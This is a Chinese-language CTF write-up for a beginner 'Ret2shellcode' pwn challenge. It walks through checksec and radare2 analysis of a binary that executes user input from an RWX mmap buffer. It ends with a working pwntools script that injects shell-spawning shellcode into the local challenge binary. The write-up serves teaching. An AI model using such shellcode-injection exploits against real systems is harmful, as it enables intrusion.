---
title: Ret2shellcode
author: 13m0n4de
difficulty: Easy
category: Pwn
image: ghcr.io/svuctf/svuctf-helloworld-2024/ret2shellcode:latest
port: 70
writeup_author: pn1fg
tags:
  - ret2shellcode
reference:
---

# Ret2shellcode

## 题目描述

## 题目解析

在开始之前，先解释一下什么是 shellcode：

- shellcode 是一段用于完成特定功能的汇编代码
- 在 PWN 题目中，通常用于获取目标系统的 shell
- 要执行 shellcode，需要对应内存区域具有可执行权限

### 查看文件信息

查看文件类型：

```
$ file ret2shellcode
ret2shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eafe942a43461467245654d327453a2eaddd0f58, for GNU/Linux 3.2.0, not stripped
```

64位 ELF 文件，动态链接，没有去除符号

查看保护机制：

```
$ checksec --file=ret2shellcode
RELRO           Partial RELRO
STACK CANARY    No canary found
NX              NX enabled
PIE             No PIE
RPATH           No RPATH
RUNPATH	        No RUNPATH
Symbols		    73 Symbols
FORTIFY	        No
Fortified	    0
Fortifiable	    1
FILE            ret2shellcode
```

NX 保护（堆栈不可执行）。

### 分析漏洞成因

我们这里需要使用工具 Radare2 对文件进行反汇编，将为二进制数据转换为可读的汇编指令，这样才方便于我们去分析程序执行流程，寻找漏洞。

首先第一步就是寻找程序入口，可以使用 `afl` 命令列出所有函数

```
$ r2 -AA ret2shellcode
[0x004010d0]> afl
0x00401080    1     11 sym.imp.putchar
0x00401090    1     11 sym.imp.puts
0x004010a0    1     11 sym.imp.mmap
0x004010b0    1     11 sym.imp.read
0x004010c0    1     11 sym.imp.setvbuf
0x004010d0    1     46 entry0
0x00401110    4     31 sym.deregister_tm_clones
0x00401140    4     49 sym.register_tm_clones
0x00401180    3     32 sym.__do_global_dtors_aux
0x004011b0    1      6 sym.frame_dummy
0x00401380    1      5 sym.__libc_csu_fini
0x00401276    1     96 sym.vuln
0x00401388    1     13 sym._fini
0x0040121b    1     91 sym.banner
0x004011b6    1    101 sym.init
0x00401310    4    101 sym.__libc_csu_init
0x00401100    1      5 sym._dl_relocate_static_pie
0x004012d6    1     45 main
0x00401000    3     27 sym._init
0x00401030    2     28 fcn.00401030
0x00401040    1     15 fcn.00401040
0x00401050    1     15 fcn.00401050
0x00401060    1     15 fcn.00401060
0x00401070    1     15 fcn.00401070
```

反编译 `main` 函数

```c
[0x004010d0]> s main
[0x004012d6]> pdg

ulong main(void)

{
    ulong uStack_10;

    uStack_10 = 0x4012e8;
    sym.init();
    *(*0x20 + -0x10) = 0x4012f2;
    sym.banner();
    *(*0x20 + -8 + -8) = 0x4012fc;
    sym.vuln();
    return 0;
}
```

程序调用了三个函数，`init`、`banner`、`vuln`，这里我们领同学们每一个函数都过一遍，后面的题解中没有这么详细了。

反编译 `init` 函数：

```c
[0x004012d6]> s sym.init
[0x004011b6]> pdg

int init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
```

程序将标准输入、标准输出和标准错误的缓冲模式全部设置为无缓冲，确保 I/O 操作立即生效，其实就是一个初始化函数。

反编译 `banner` 函数：

```c
int banner()
{
  puts(" ___  _  _  __  __  ___  ____  ____ ");
  puts("/ __)( \\/ )(  )(  )/ __)(_  _)( ___)");
  puts("\\__ \\ \\  /  )(__)(( (__   )(   )__) ");
  puts("(___/  \\/  (______)\\___) (__) (__) ");
  putchar(10);
  puts("Welcome to the SVUCTF HELLOWORLD 2024!");
  return putchar(10);

```

程序利用 `puts` 函数打印了一些 ASCII 艺术字。

反编译 `vuln` 函数

```c
[0x0040121b]> s sym.vuln
[0x00401276]> pdg

__int64 vuln()
{
  void *buf; // [rsp+8h] [rbp-8h]

  buf = mmap(0LL, 0x100uLL, 7, 34, -1, 0LL);
  puts("Send me shellcode:");
  read(0, buf, 0x100uLL);
  return ((__int64 (*)(void))buf)();
}
```

程序的关键在于此处的 `mmap` 调用和跳转执行：

- 申请了一块大小为 0x100 的内存
- 内存权限设置为可读、可写、可执行 (`PROT_READ | PROT_WRITE | PROT_EXEC`)
- 直接将用户输入读入该内存区域
- 最后跳转执行这段代码

所以本题大致的攻击思路就是，通过 `read` 函数我们将一段 shellcode 写入内存中，程序会跳转执行它从而拿到 shell。

### 编写利用程序

使用 pwntools 中的 shellcraft 模块生成 shellcode 汇编代码，并使用 `asm` 函数将其编译为机器码。

[exp.py](./writeup/exp.py):

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("../attachments/ret2shellcode")

shellcode = asm(shellcraft.sh())

io.sendafter(b"Send me shellcode:\n", shellcode)

io.interactive()
```
